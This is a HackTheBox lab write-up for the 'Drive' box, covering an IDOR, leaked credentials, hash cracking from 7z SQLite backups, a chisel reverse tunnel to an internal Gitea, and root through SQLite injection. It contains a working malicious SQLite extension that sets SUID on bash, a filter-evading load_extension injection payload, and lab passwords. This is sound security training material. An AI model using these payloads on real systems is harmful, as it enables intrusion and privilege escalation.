---
title: "Drive"
date: 2024-02-17
type: docs
tags:
  - htb
  - linux
  - hard
  - idor
  - django
  - sqlite
  - hashcat
  - gitea
  - chisel
  - 7zip
  - git-history
  - sqlite-injection
  - load-extension
  - suid
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Hard, **Released:** 2024-02-17, **IP:** `10.10.11.235` , `drive.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. "Doodle Grive" file sharing app. Register, upload, and notice files are referenced by a sequential numeric id. **IDOR** on `/<id>/block` reveals other users' private notes.
2. A leaked note gives `martin : Xk4@KjyrYv8t194L!`. SSH.
3. `/var/www/backup/db.sqlite3` and archived `*_db_backup.sqlite3.7z` snapshots hold Django user hashes. Different months use different hash types, some are **unsalted SHA1** (`-m 124`).
4. Internal **Gitea** on `:3000` (tunnel with chisel). Log in as `martin`. `cris`'s `DoogleDrive` repo has `db_backup.sh` with the 7z password `H@ckThisP@ssW0rDIfY0uC@n:)`.
5. Crack the October / November snapshots. `tom : johnmayer7`. SSH as **`tom`**.
6. `tom` can run `/usr/bin/doodleGrive-cli` (password in the repo / app). Its "activate user account" option runs `sqlite3 ... 'UPDATE ... WHERE username="<you>"'` **as root**, and `<you>` is injectable. `"+load_extension(char(...))+"` loads a malicious SQLite extension. Root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| leaked note (IDOR) | `martin : Xk4@KjyrYv8t194L!` |
| `db_backup.sh` in Gitea | 7z password `H@ckThisP@ssW0rDIfY0uC@n:)` |
| cracked November snapshot | `tom : johnmayer7` |
| `user.txt` | `/home/tom/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Drive is a long "loot the database, over and over" box. An **IDOR** gives the first credential, then the real work is a chain of **SQLite backup snapshots**: the app takes password protected 7z backups on a schedule, you find the 7z password in a **Gitea repo's history**, and then you crack the *right month's* hashes because the developers changed their password (and the hash algorithm) between snapshots. Root is a lovely **SQLite injection into a `load_extension`**: a root CLI runs a `sqlite3` `UPDATE` with your username interpolated, and SQLite's `load_extension()` will `dlopen` any `.so` you name, whose `sqlite3_<name>_init` runs your code as root.

Related IDOR boxes: [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Road](/writeups/tryhackme/linux/easy/road/). Related Gitea: [Cat](/writeups/hackthebox/linux/medium/cat/), [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Titanic](/writeups/hackthebox/linux/easy/titanic/). Related "secret in git history": [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Enterprise](/writeups/tryhackme/windows/hard/enterprise/). Related SQLite `load_extension` RCE: this is the reference case.

---

## Full Walkthrough

### Nmap scan

```console
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Doodle Grive
3000/tcp filtered ppp                # Gitea, only reachable from inside
```

### IDOR

I registered a throwaway account and started poking around the upload flow, and noticed right away that every file I uploaded showed up at a predictable, sequential numeric id (`.../112/`, `.../113/`, and so on). Sequential IDs on an object endpoint are always worth a sweep, so I built a full number range and threw it at Burp Intruder rather than guessing individual values:

```bash
seq 0 99999 > numbers.lst
```

That turned up hits at `79, 98, 99, 101`, and visiting `/<id>/block` (the "block file" / details view) for each of them rendered the note content for files that clearly weren't mine.

<div class="callout callout-note">

**Why `/block` and not the download**

The app checks ownership on the *download* endpoint but not on the *details/block* view, which still renders the note body and metadata. That is the IDOR. One note is a message to the team with `martin`'s server password.

</div>

```
please use the password "Xk4@KjyrYv8t194L!"
```

```bash
ssh martin@drive.htb
```

### The SQLite backups

Once I had a shell as `martin`, I went looking around the web application's directory structure for anything that looked like it held persistent data, and a `backup` folder stood out immediately:

```bash
ls /var/www/backup/
# db.sqlite3   1_Oct_db_backup.sqlite3.7z   1_Nov_db_backup.sqlite3.7z   1_Dec_db_backup.sqlite3.7z
sqlite3 db.sqlite3 '.tables'
sqlite3 db.sqlite3 'select id,password,username,email from accounts_customuser'
```

```console
22|sha1$E9cadw34Gx4E59Qt18NLXR$60919b...|martinCruz|martin@drive.htb
23|sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb...|tomHands|tom@drive.htb
24|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a...|crisDisel|cris@drive.htb
```

The current `db.sqlite3` handed me the live user table straight away, but the `.7z` snapshots sitting alongside it were password protected, and given that a hard box rarely gives up its best material for free, I assumed those older backups were where the real prize was hiding.

### Gitea, the 7z password

Looking for anything that might explain how those backups get created, I found `/usr/local/bin` held several service binaries, `gitea` among them, which told me there was an internal Git instance I hadn't been able to reach directly since port 3000 only showed up as filtered in my initial scan. Rather than fight the firewall, I tunneled straight through the box I already controlled:

```bash
# target
./chisel client 10.10.14.238:8085 R:1080:socks
# attacker
./chisel server --port 8085 --reverse
```

Browse `http://127.0.0.1:3000` through the SOCKS proxy. `tom` does not log in, but `martin : Xk4@KjyrYv8t194L!` does. `cris`'s **`DoogleDrive`** repo has `db_backup.sh`:

```bash
7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' "/var/www/backup/$(date +%d_%b)_db_backup.sqlite3.7z" ...
```

<div class="callout callout-note">

**Check git history, not just the tip**

Even if `db_backup.sh` did not have the password on the current branch, `git log -p` / the Gitea "commits" view would show it. Any secret ever committed is recoverable.

</div>

### Crack the right snapshot

With the 7z password in hand, I worked through the archived snapshots one month at a time rather than assuming the newest was necessarily the useful one:

```bash
7z x -p'H@ckThisP@ssW0rDIfY0uC@n:)' 1_Nov_db_backup.sqlite3.7z
sqlite3 1_Nov_db_backup.sqlite3 'select username,password from accounts_customuser'
```

<div class="callout callout-note">

**Different months, different hashes**

The December snapshot uses Django's PBKDF2 (`-m 10000`), and those do not crack. Earlier snapshots (Oct, Nov) use **unsalted SHA1** in Django's `sha1$<salt>$<hash>` wrapper. hashcat mode **124** (`Django (SHA-1)`) handles the format directly. The November `tom` hash cracks to `johnmayer7`; the October one is an older password (`johniscool`) that no longer works.

</div>

```bash
hashcat -m 124 nov.hashes rockyou.txt
# sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb...:johnmayer7
ssh tom@drive.htb        # johnmayer7
```

### Privilege Escalation, SQLite injection into load_extension

With a foothold as `tom`, I went looking for anything he could run with elevated rights, and found a custom binary sitting at `/usr/bin/doodleGrive-cli`. It prompts for a password that I'd already picked up from the app source and the Gitea repo, and once past that gate it drops into an administrative menu.

<div class="callout callout-note">

**SQLite injection via `load_extension`**

Its **"activate user account"** option does:
```
/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \
  'UPDATE accounts_customuser SET is_active=1 WHERE username="<INPUT>";'
```
as **root**, and `<INPUT>` is interpolated with only a light character filter. SQLite has no stacked queries, but it has **`load_extension()`**, which `dlopen`s a shared object and calls `sqlite3_<basename>_init`. So:

1. Compile an extension that runs a command in its init:
```c
// poc.c  ->  gcc -shared -fPIC -o poc.so poc.c
#include <sqlite3ext.h>
SQLITE_EXTENSION_INIT1
int sqlite3_poc_init(sqlite3 *db, char **err, const sqlite3_api_routines *api){
    SQLITE_EXTENSION_INIT2(api);
    system("chmod u+s /bin/bash");
    return 0;
}
```
2. Inject a username that closes the string, calls `load_extension`, and re-opens it, using `char()` to smuggle the path past the filter:
```
username = a" + load_extension(char(46,47,112,111,99)) + "     # ./poc
```
(`char(46,47,112,111,99)` = `./poc`; put `poc.so` in the CLI's working directory.)
3. `load_extension` must be enabled, which the CLI's SQLite build allows. The init runs as root:
```bash
/bin/bash -p
cat /root/root.txt
```

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/tom/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Check authorization on every endpoint that returns object data**, not just the primary one. The `/block` view leaked what `/download` protected.
- **Do not store plaintext or reversible secrets in backups**, and protect backup archives with a key from a vault, not a script in a repo.
- **Rotate credentials that were ever committed to git.** History is forever.
- **Never interpolate input into a `sqlite3` command line.** Use bound parameters, and build SQLite **without** `load_extension` (`-DSQLITE_OMIT_LOAD_EXTENSION`) for anything that touches untrusted data.
- **Django's legacy SHA1 hasher is not acceptable.** Force a PBKDF2/argon2 rehash on login.

---

## Related Writeups

- **IDOR / broken access control:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Road](/writeups/tryhackme/linux/easy/road/)
- **Gitea and secrets in git history:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Enterprise](/writeups/tryhackme/windows/hard/enterprise/), [Titanic](/writeups/hackthebox/linux/easy/titanic/)
- **Crack hashes from an app / backup DB:** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Heal](/writeups/hackthebox/linux/medium/heal/), [Bolt](/writeups/hackthebox/linux/medium/bolt/)
- **SQL(ite) injection to code execution:** [Cat](/writeups/hackthebox/linux/medium/cat/), [PC](/writeups/hackthebox/linux/easy/pc/)

## References

- HTB Drive (0xdf) <https://0xdf.gitlab.io/2024/02/17/htb-drive.html>
- SQLite load_extension <https://www.sqlite.org/loadext.html>
- hashcat mode 124 (Django SHA-1) <https://hashcat.net/wiki/doku.php?id=example_hashes>
- The root privilege escalation via `doodleGrive-cli` was cross-referenced against public writeups for this box.
